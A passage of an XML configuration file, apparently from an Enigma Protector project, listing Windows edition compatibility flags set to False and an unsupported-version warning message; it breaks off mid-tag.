      <WIN_VER_WINDOWS2008_DATACENTER_SERVER_V>False</WIN_VER_WINDOWS2008_DATACENTER_SERVER_V>
      <WIN_VER_WINDOWS2008_ENTERPRICE>False</WIN_VER_WINDOWS2008_ENTERPRICE>
      <WIN_VER_WINDOWS2008_ENTERPRISE_SERVER>False</WIN_VER_WINDOWS2008_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_CORE>False</WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_CORE>
      <WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_V>False</WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_V>
      <WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_CORE_V>False</WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_CORE_V>
      <WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_IA64>False</WIN_VER_WINDOWS2008_ENTERPRISE_SERVER_IA64>
      <WIN_VER_WINDOWS2008_HOME_BASIC>False</WIN_VER_WINDOWS2008_HOME_BASIC>
      <WIN_VER_WINDOWS2008_HOME_PREMIUM>False</WIN_VER_WINDOWS2008_HOME_PREMIUM>
      <WIN_VER_WINDOWS2008_HOME_SERVER>False</WIN_VER_WINDOWS2008_HOME_SERVER>
      <WIN_VER_WINDOWS2008_SERVER_FOR_SMALLBUSINESS>False</WIN_VER_WINDOWS2008_SERVER_FOR_SMALLBUSINESS>
      <WIN_VER_WINDOWS2008_SMALLBUSINESS_SERVER>False</WIN_VER_WINDOWS2008_SMALLBUSINESS_SERVER>
      <WIN_VER_WINDOWS2008_SMALLBUSINESS_SERVER_PREMIUM>False</WIN_VER_WINDOWS2008_SMALLBUSINESS_SERVER_PREMIUM>
      <WIN_VER_WINDOWS2008_MEDIUMBUSINESS_SERVER_MANAGEMENT>False</WIN_VER_WINDOWS2008_MEDIUMBUSINESS_SERVER_MANAGEMENT>
      <WIN_VER_WINDOWS2008_MEDIUMBUSINESS_SERVER_MESSAGING>False</WIN_VER_WINDOWS2008_MEDIUMBUSINESS_SERVER_MESSAGING>
      <WIN_VER_WINDOWS2008_MEDIUMBUSINESS_SERVER_SECURITY>False</WIN_VER_WINDOWS2008_MEDIUMBUSINESS_SERVER_SECURITY>
      <WIN_VER_WINDOWS2008_STANDARD_SERVER>False</WIN_VER_WINDOWS2008_STANDARD_SERVER>
      <WIN_VER_WINDOWS2008_STANDARD_SERVER_V>False</WIN_VER_WINDOWS2008_STANDARD_SERVER_V>
      <WIN_VER_WINDOWS2008_STANDARD_SERVER_CORE>False</WIN_VER_WINDOWS2008_STANDARD_SERVER_CORE>
      <WIN_VER_WINDOWS2008_STANDARD_SERVER_CORE_V>False</WIN_VER_WINDOWS2008_STANDARD_SERVER_CORE_V>
      <WIN_VER_WINDOWS2008_STARTER>False</WIN_VER_WINDOWS2008_STARTER>
      <WIN_VER_WINDOWS2008_STORAGE_ENTERPRISE_SERVER>False</WIN_VER_WINDOWS2008_STORAGE_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWS2008_STORAGE_EXPRESS_SERVER>False</WIN_VER_WINDOWS2008_STORAGE_EXPRESS_SERVER>
      <WIN_VER_WINDOWS2008_STORAGE_STANDARD_SERVER>False</WIN_VER_WINDOWS2008_STORAGE_STANDARD_SERVER>
      <WIN_VER_WINDOWS2008_STORAGE_WORKGROUP_SERVER>False</WIN_VER_WINDOWS2008_STORAGE_WORKGROUP_SERVER>
      <WIN_VER_WINDOWS2008_UNDEFINED>False</WIN_VER_WINDOWS2008_UNDEFINED>
      <WIN_VER_WINDOWS2008_ULTIMATE>False</WIN_VER_WINDOWS2008_ULTIMATE>
      <WIN_VER_WINDOWS2008_WEB_SERVER>False</WIN_VER_WINDOWS2008_WEB_SERVER>
      <WIN_VER_WINDOWS2008_WEB_SERVER_CORE>False</WIN_VER_WINDOWS2008_WEB_SERVER_CORE>
      <WIN_VER_WINDOWS2008_UNLICENSED>False</WIN_VER_WINDOWS2008_UNLICENSED>
      <WIN_VER_WINDOWS2008R2>False</WIN_VER_WINDOWS2008R2>
      <WIN_VER_WINDOWS2008R2_BUSINESS>False</WIN_VER_WINDOWS2008R2_BUSINESS>
      <WIN_VER_WINDOWS2008R2_CLUSTER_SERVER>False</WIN_VER_WINDOWS2008R2_CLUSTER_SERVER>
      <WIN_VER_WINDOWS2008R2_DATACENTER_SERVER>False</WIN_VER_WINDOWS2008R2_DATACENTER_SERVER>
      <WIN_VER_WINDOWS2008R2_DATACENTER_SERVER_CORE>False</WIN_VER_WINDOWS2008R2_DATACENTER_SERVER_CORE>
      <WIN_VER_WINDOWS2008R2_DATACENTER_SERVER_CORE_V>False</WIN_VER_WINDOWS2008R2_DATACENTER_SERVER_CORE_V>
      <WIN_VER_WINDOWS2008R2_DATACENTER_SERVER_V>False</WIN_VER_WINDOWS2008R2_DATACENTER_SERVER_V>
      <WIN_VER_WINDOWS2008R2_ENTERPRICE>False</WIN_VER_WINDOWS2008R2_ENTERPRICE>
      <WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER>False</WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_CORE>False</WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_CORE>
      <WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_V>False</WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_V>
      <WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_CORE_V>False</WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_CORE_V>
      <WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_IA64>False</WIN_VER_WINDOWS2008R2_ENTERPRISE_SERVER_IA64>
      <WIN_VER_WINDOWS2008R2_HOME_BASIC>False</WIN_VER_WINDOWS2008R2_HOME_BASIC>
      <WIN_VER_WINDOWS2008R2_HOME_PREMIUM>False</WIN_VER_WINDOWS2008R2_HOME_PREMIUM>
      <WIN_VER_WINDOWS2008R2_HOME_SERVER>False</WIN_VER_WINDOWS2008R2_HOME_SERVER>
      <WIN_VER_WINDOWS2008R2_SERVER_FOR_SMALLBUSINESS>False</WIN_VER_WINDOWS2008R2_SERVER_FOR_SMALLBUSINESS>
      <WIN_VER_WINDOWS2008R2_SMALLBUSINESS_SERVER>False</WIN_VER_WINDOWS2008R2_SMALLBUSINESS_SERVER>
      <WIN_VER_WINDOWS2008R2_SMALLBUSINESS_SERVER_PREMIUM>False</WIN_VER_WINDOWS2008R2_SMALLBUSINESS_SERVER_PREMIUM>
      <WIN_VER_WINDOWS2008R2_MEDIUMBUSINESS_SERVER_MANAGEMENT>False</WIN_VER_WINDOWS2008R2_MEDIUMBUSINESS_SERVER_MANAGEMENT>
      <WIN_VER_WINDOWS2008R2_MEDIUMBUSINESS_SERVER_MESSAGING>False</WIN_VER_WINDOWS2008R2_MEDIUMBUSINESS_SERVER_MESSAGING>
      <WIN_VER_WINDOWS2008R2_MEDIUMBUSINESS_SERVER_SECURITY>False</WIN_VER_WINDOWS2008R2_MEDIUMBUSINESS_SERVER_SECURITY>
      <WIN_VER_WINDOWS2008R2_STANDARD_SERVER>False</WIN_VER_WINDOWS2008R2_STANDARD_SERVER>
      <WIN_VER_WINDOWS2008R2_STANDARD_SERVER_V>False</WIN_VER_WINDOWS2008R2_STANDARD_SERVER_V>
      <WIN_VER_WINDOWS2008R2_STANDARD_SERVER_CORE>False</WIN_VER_WINDOWS2008R2_STANDARD_SERVER_CORE>
      <WIN_VER_WINDOWS2008R2_STANDARD_SERVER_CORE_V>False</WIN_VER_WINDOWS2008R2_STANDARD_SERVER_CORE_V>
      <WIN_VER_WINDOWS2008R2_STARTER>False</WIN_VER_WINDOWS2008R2_STARTER>
      <WIN_VER_WINDOWS2008R2_STORAGE_ENTERPRISE_SERVER>False</WIN_VER_WINDOWS2008R2_STORAGE_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWS2008R2_STORAGE_EXPRESS_SERVER>False</WIN_VER_WINDOWS2008R2_STORAGE_EXPRESS_SERVER>
      <WIN_VER_WINDOWS2008R2_STORAGE_STANDARD_SERVER>False</WIN_VER_WINDOWS2008R2_STORAGE_STANDARD_SERVER>
      <WIN_VER_WINDOWS2008R2_STORAGE_WORKGROUP_SERVER>False</WIN_VER_WINDOWS2008R2_STORAGE_WORKGROUP_SERVER>
      <WIN_VER_WINDOWS2008R2_UNDEFINED>False</WIN_VER_WINDOWS2008R2_UNDEFINED>
      <WIN_VER_WINDOWS2008R2_ULTIMATE>False</WIN_VER_WINDOWS2008R2_ULTIMATE>
      <WIN_VER_WINDOWS2008R2_WEB_SERVER>False</WIN_VER_WINDOWS2008R2_WEB_SERVER>
      <WIN_VER_WINDOWS2008R2_WEB_SERVER_CORE>False</WIN_VER_WINDOWS2008R2_WEB_SERVER_CORE>
      <WIN_VER_WINDOWS2008R2_UNLICENSED>False</WIN_VER_WINDOWS2008R2_UNLICENSED>
      <WIN_VER_WINDOWSSEVEN>False</WIN_VER_WINDOWSSEVEN>
      <WIN_VER_WINDOWSSEVEN_BUSINESS>False</WIN_VER_WINDOWSSEVEN_BUSINESS>
      <WIN_VER_WINDOWSSEVEN_CLUSTER_SERVER>False</WIN_VER_WINDOWSSEVEN_CLUSTER_SERVER>
      <WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER>False</WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER>
      <WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER_CORE>False</WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER_CORE>
      <WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER_CORE_V>False</WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER_CORE_V>
      <WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER_V>False</WIN_VER_WINDOWSSEVEN_DATACENTER_SERVER_V>
      <WIN_VER_WINDOWSSEVEN_ENTERPRICE>False</WIN_VER_WINDOWSSEVEN_ENTERPRICE>
      <WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER>False</WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_CORE>False</WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_CORE>
      <WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_V>False</WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_V>
      <WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_CORE_V>False</WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_CORE_V>
      <WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_IA64>False</WIN_VER_WINDOWSSEVEN_ENTERPRISE_SERVER_IA64>
      <WIN_VER_WINDOWSSEVEN_HOME_BASIC>False</WIN_VER_WINDOWSSEVEN_HOME_BASIC>
      <WIN_VER_WINDOWSSEVEN_HOME_PREMIUM>False</WIN_VER_WINDOWSSEVEN_HOME_PREMIUM>
      <WIN_VER_WINDOWSSEVEN_HOME_SERVER>False</WIN_VER_WINDOWSSEVEN_HOME_SERVER>
      <WIN_VER_WINDOWSSEVEN_SERVER_FOR_SMALLBUSINESS>False</WIN_VER_WINDOWSSEVEN_SERVER_FOR_SMALLBUSINESS>
      <WIN_VER_WINDOWSSEVEN_SMALLBUSINESS_SERVER>False</WIN_VER_WINDOWSSEVEN_SMALLBUSINESS_SERVER>
      <WIN_VER_WINDOWSSEVEN_SMALLBUSINESS_SERVER_PREMIUM>False</WIN_VER_WINDOWSSEVEN_SMALLBUSINESS_SERVER_PREMIUM>
      <WIN_VER_WINDOWSSEVEN_MEDIUMBUSINESS_SERVER_MANAGEMENT>False</WIN_VER_WINDOWSSEVEN_MEDIUMBUSINESS_SERVER_MANAGEMENT>
      <WIN_VER_WINDOWSSEVEN_MEDIUMBUSINESS_SERVER_MESSAGING>False</WIN_VER_WINDOWSSEVEN_MEDIUMBUSINESS_SERVER_MESSAGING>
      <WIN_VER_WINDOWSSEVEN_MEDIUMBUSINESS_SERVER_SECURITY>False</WIN_VER_WINDOWSSEVEN_MEDIUMBUSINESS_SERVER_SECURITY>
      <WIN_VER_WINDOWSSEVEN_STANDARD_SERVER>False</WIN_VER_WINDOWSSEVEN_STANDARD_SERVER>
      <WIN_VER_WINDOWSSEVEN_STANDARD_SERVER_V>False</WIN_VER_WINDOWSSEVEN_STANDARD_SERVER_V>
      <WIN_VER_WINDOWSSEVEN_STANDARD_SERVER_CORE>False</WIN_VER_WINDOWSSEVEN_STANDARD_SERVER_CORE>
      <WIN_VER_WINDOWSSEVEN_STANDARD_SERVER_CORE_V>False</WIN_VER_WINDOWSSEVEN_STANDARD_SERVER_CORE_V>
      <WIN_VER_WINDOWSSEVEN_STARTER>False</WIN_VER_WINDOWSSEVEN_STARTER>
      <WIN_VER_WINDOWSSEVEN_STORAGE_ENTERPRISE_SERVER>False</WIN_VER_WINDOWSSEVEN_STORAGE_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWSSEVEN_STORAGE_EXPRESS_SERVER>False</WIN_VER_WINDOWSSEVEN_STORAGE_EXPRESS_SERVER>
      <WIN_VER_WINDOWSSEVEN_STORAGE_STANDARD_SERVER>False</WIN_VER_WINDOWSSEVEN_STORAGE_STANDARD_SERVER>
      <WIN_VER_WINDOWSSEVEN_STORAGE_WORKGROUP_SERVER>False</WIN_VER_WINDOWSSEVEN_STORAGE_WORKGROUP_SERVER>
      <WIN_VER_WINDOWSSEVEN_UNDEFINED>False</WIN_VER_WINDOWSSEVEN_UNDEFINED>
      <WIN_VER_WINDOWSSEVEN_ULTIMATE>False</WIN_VER_WINDOWSSEVEN_ULTIMATE>
      <WIN_VER_WINDOWSSEVEN_WEB_SERVER>False</WIN_VER_WINDOWSSEVEN_WEB_SERVER>
      <WIN_VER_WINDOWSSEVEN_WEB_SERVER_CORE>False</WIN_VER_WINDOWSSEVEN_WEB_SERVER_CORE>
      <WIN_VER_WINDOWSSEVEN_UNLICENSED>False</WIN_VER_WINDOWSSEVEN_UNLICENSED>
      <ShowMessageBeforeTermination>True</ShowMessageBeforeTermination>
      <Message>
        <Title>Warning</Title>
        <Text>Current Windows Version &quot;%CU_WINVER%&quot; does not support!</Text>
        <UseHL>False</UseHL>
        <HLSentence>Enigma Protector</HLSentence>
        <HLURL>http://www.enigmaprotector.com/</HLURL>
        <Icon>0</Icon>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </Message>
      <WIN_VER_WINDOWS8>False</WIN_VER_WINDOWS8>
      <WIN_VER_WINDOWS8_UNLICENSED>False</WIN_VER_WINDOWS8_UNLICENSED>
      <WIN_VER_WINDOWS8_BUSINESS>False</WIN_VER_WINDOWS8_BUSINESS>
      <WIN_VER_WINDOWS8_CLUSTER_SERVER>False</WIN_VER_WINDOWS8_CLUSTER_SERVER>
      <WIN_VER_WINDOWS8_CLUSTER_SERVER_V>False</WIN_VER_WINDOWS8_CLUSTER_SERVER_V>
      <WIN_VER_WINDOWS8_CORE>False</WIN_VER_WINDOWS8_CORE>
      <WIN_VER_WINDOWS8_CORE_COUNTRYSPECIFIC>False</WIN_VER_WINDOWS8_CORE_COUNTRYSPECIFIC>
      <WIN_VER_WINDOWS8_CORE_SINGLELANGUAGE>False</WIN_VER_WINDOWS8_CORE_SINGLELANGUAGE>
      <WIN_VER_WINDOWS8_DATACENTER_EVALUATION_SERVER>False</WIN_VER_WINDOWS8_DATACENTER_EVALUATION_SERVER>
      <WIN_VER_WINDOWS8_DATACENTER_SERVER>False</WIN_VER_WINDOWS8_DATACENTER_SERVER>
      <WIN_VER_WINDOWS8_DATACENTER_SERVER_CORE>False</WIN_VER_WINDOWS8_DATACENTER_SERVER_CORE>
      <WIN_VER_WINDOWS8_DATACENTER_SERVER_CORE_V>False</WIN_VER_WINDOWS8_DATACENTER_SERVER_CORE_V>
      <WIN_VER_WINDOWS8_DATACENTER_SERVER_V>False</WIN_VER_WINDOWS8_DATACENTER_SERVER_V>
      <WIN_VER_WINDOWS8_ENTERPRISE>False</WIN_VER_WINDOWS8_ENTERPRISE>
      <WIN_VER_WINDOWS8_ENTERPRISE_N_EVALUATION>False</WIN_VER_WINDOWS8_ENTERPRISE_N_EVALUATION>
      <WIN_VER_WINDOWS8_ENTERPRISE_EVALUATION>False</WIN_VER_WINDOWS8_ENTERPRISE_EVALUATION>
      <WIN_VER_WINDOWS8_ENTERPRISE_SERVER>False</WIN_VER_WINDOWS8_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWS8_ENTERPRISE_SERVER_CORE>False</WIN_VER_WINDOWS8_ENTERPRISE_SERVER_CORE>
      <WIN_VER_WINDOWS8_ENTERPRISE_SERVER_CORE_V>False</WIN_VER_WINDOWS8_ENTERPRISE_SERVER_CORE_V>
      <WIN_VER_WINDOWS8_ENTERPRISE_SERVER_IA64>False</WIN_VER_WINDOWS8_ENTERPRISE_SERVER_IA64>
      <WIN_VER_WINDOWS8_ENTERPRISE_SERVER_V>False</WIN_VER_WINDOWS8_ENTERPRISE_SERVER_V>
      <WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_MGMT>False</WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_MGMT>
      <WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_ADDL>False</WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_ADDL>
      <WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_MGMTSVC>False</WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_MGMTSVC>
      <WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_ADDLSVC>False</WIN_VER_WINDOWS8_ESSENTIALBUSINESS_SERVER_ADDLSVC>
      <WIN_VER_WINDOWS8_HOME_BASIC>False</WIN_VER_WINDOWS8_HOME_BASIC>
      <WIN_VER_WINDOWS8_HOME_PREMIUM>False</WIN_VER_WINDOWS8_HOME_PREMIUM>
      <WIN_VER_WINDOWS8_HOME_PREMIUM_SERVER>False</WIN_VER_WINDOWS8_HOME_PREMIUM_SERVER>
      <WIN_VER_WINDOWS8_HOME_SERVER>False</WIN_VER_WINDOWS8_HOME_SERVER>
      <WIN_VER_WINDOWS8_HYPERV>False</WIN_VER_WINDOWS8_HYPERV>
      <WIN_VER_WINDOWS8_MEDIUMBUSINESS_SERVER_MANAGEMENT>False</WIN_VER_WINDOWS8_MEDIUMBUSINESS_SERVER_MANAGEMENT>
      <WIN_VER_WINDOWS8_MEDIUMBUSINESS_SERVER_MESSAGING>False</WIN_VER_WINDOWS8_MEDIUMBUSINESS_SERVER_MESSAGING>
      <WIN_VER_WINDOWS8_MEDIUMBUSINESS_SERVER_SECURITY>False</WIN_VER_WINDOWS8_MEDIUMBUSINESS_SERVER_SECURITY>
      <WIN_VER_WINDOWS8_MULTIPOINT_STANDARD_SERVER>False</WIN_VER_WINDOWS8_MULTIPOINT_STANDARD_SERVER>
      <WIN_VER_WINDOWS8_MULTIPOINT_PREMIUM_SERVER>False</WIN_VER_WINDOWS8_MULTIPOINT_PREMIUM_SERVER>
      <WIN_VER_WINDOWS8_PROFESSIONAL>False</WIN_VER_WINDOWS8_PROFESSIONAL>
      <WIN_VER_WINDOWS8_PROFESSIONAL_WMC>False</WIN_VER_WINDOWS8_PROFESSIONAL_WMC>
      <WIN_VER_WINDOWS8_SB_SOLUTION_SERVER_EM>False</WIN_VER_WINDOWS8_SB_SOLUTION_SERVER_EM>
      <WIN_VER_WINDOWS8_SERVER_FOR_SB_SOLUTIONS>False</WIN_VER_WINDOWS8_SERVER_FOR_SB_SOLUTIONS>
      <WIN_VER_WINDOWS8_SERVER_FOR_SB_SOLUTIONS_EM>False</WIN_VER_WINDOWS8_SERVER_FOR_SB_SOLUTIONS_EM>
      <WIN_VER_WINDOWS8_SERVER_FOR_SMALLBUSINESS>False</WIN_VER_WINDOWS8_SERVER_FOR_SMALLBUSINESS>
      <WIN_VER_WINDOWS8_SERVER_FOR_SMALLBUSINESS_V>False</WIN_VER_WINDOWS8_SERVER_FOR_SMALLBUSINESS_V>
      <WIN_VER_WINDOWS8_SERVER_FOUNDATION>False</WIN_VER_WINDOWS8_SERVER_FOUNDATION>
      <WIN_VER_WINDOWS8_SB_SOLUTION_SERVER>False</WIN_VER_WINDOWS8_SB_SOLUTION_SERVER>
      <WIN_VER_WINDOWS8_SMALLBUSINESS_SERVER>False</WIN_VER_WINDOWS8_SMALLBUSINESS_SERVER>
      <WIN_VER_WINDOWS8_SMALLBUSINESS_SERVER_PREMIUM>False</WIN_VER_WINDOWS8_SMALLBUSINESS_SERVER_PREMIUM>
      <WIN_VER_WINDOWS8_SMALLBUSINESS_SERVER_PREMIUM_CORE>False</WIN_VER_WINDOWS8_SMALLBUSINESS_SERVER_PREMIUM_CORE>
      <WIN_VER_WINDOWS8_SOLUTION_EMBEDDEDSERVER>False</WIN_VER_WINDOWS8_SOLUTION_EMBEDDEDSERVER>
      <WIN_VER_WINDOWS8_STANDARD_EVALUATION_SERVER>False</WIN_VER_WINDOWS8_STANDARD_EVALUATION_SERVER>
      <WIN_VER_WINDOWS8_STANDARD_SERVER>False</WIN_VER_WINDOWS8_STANDARD_SERVER>
      <WIN_VER_WINDOWS8_STANDARD_SERVER_CORE>False</WIN_VER_WINDOWS8_STANDARD_SERVER_CORE>
      <WIN_VER_WINDOWS8_STANDARD_SERVER_V>False</WIN_VER_WINDOWS8_STANDARD_SERVER_V>
      <WIN_VER_WINDOWS8_STANDARD_SERVER_CORE_V>False</WIN_VER_WINDOWS8_STANDARD_SERVER_CORE_V>
      <WIN_VER_WINDOWS8_STANDARD_SERVER_SOLUTIONS>False</WIN_VER_WINDOWS8_STANDARD_SERVER_SOLUTIONS>
      <WIN_VER_WINDOWS8_STANDARD_SERVER_SOLUTIONS_CORE>False</WIN_VER_WINDOWS8_STANDARD_SERVER_SOLUTIONS_CORE>
      <WIN_VER_WINDOWS8_STARTER>False</WIN_VER_WINDOWS8_STARTER>
      <WIN_VER_WINDOWS8_STORAGE_ENTERPRISE_SERVER>False</WIN_VER_WINDOWS8_STORAGE_ENTERPRISE_SERVER>
      <WIN_VER_WINDOWS8_STORAGE_ENTERPRISE_SERVER_CORE>False</WIN_VER_WINDOWS8_STORAGE_ENTERPRISE_SERVER_CORE>
      <WIN_VER_WINDOWS8_STORAGE_EXPRESS_SERVER>False</WIN_VER_WINDOWS8_STORAGE_EXPRESS_SERVER>
      <WIN_VER_WINDOWS8_STORAGE_EXPRESS_SERVER_CORE>False</WIN_VER_WINDOWS8_STORAGE_EXPRESS_SERVER_CORE>
      <WIN_VER_WINDOWS8_STORAGE_STANDARD_EVALUATION_SERVER>False</WIN_VER_WINDOWS8_STORAGE_STANDARD_EVALUATION_SERVER>
      <WIN_VER_WINDOWS8_STORAGE_STANDARD_SERVER>False</WIN_VER_WINDOWS8_STORAGE_STANDARD_SERVER>
      <WIN_VER_WINDOWS8_STORAGE_STANDARD_SERVER_CORE>False</WIN_VER_WINDOWS8_STORAGE_STANDARD_SERVER_CORE>
      <WIN_VER_WINDOWS8_STORAGE_WORKGROUP_EVALUATION_SERVER>False</WIN_VER_WINDOWS8_STORAGE_WORKGROUP_EVALUATION_SERVER>
      <WIN_VER_WINDOWS8_STORAGE_WORKGROUP_SERVER>False</WIN_VER_WINDOWS8_STORAGE_WORKGROUP_SERVER>
      <WIN_VER_WINDOWS8_STORAGE_WORKGROUP_SERVER_CORE>False</WIN_VER_WINDOWS8_STORAGE_WORKGROUP_SERVER_CORE>
      <WIN_VER_WINDOWS8_UNDEFINED>False</WIN_VER_WINDOWS8_UNDEFINED>
      <WIN_VER_WINDOWS8_ULTIMATE>False</WIN_VER_WINDOWS8_ULTIMATE>
      <WIN_VER_WINDOWS8_WEB_SERVER>False</WIN_VER_WINDOWS8_WEB_SERVER>
      <WIN_VER_WINDOWS8_WEB_SERVER_CORE>False</WIN_VER_WINDOWS8_WEB_SERVER_CORE>
      <WIN_VER_WINDOWS2012>False</WIN_VER_WINDOWS2012>
      <WIN_VER_WINDOWS2012_UNLICENSED>False</WIN_VER_WINDOWS2012_UNLICENSED>
      <WIN_VER_WINDOWS2012_BUSINESS>False</WIN_VER_WINDOWS2012_BUSINESS>
      <WIN_VER_WINDOWS2012_CLUSTER_SERVER>False</WIN_VER_WINDOWS2012_CLUSTER_SERVER>
      <WIN_VER_WINDOWS2012_CLUSTER_SERVER_V>False</WIN_VER_WINDOWS2012_CL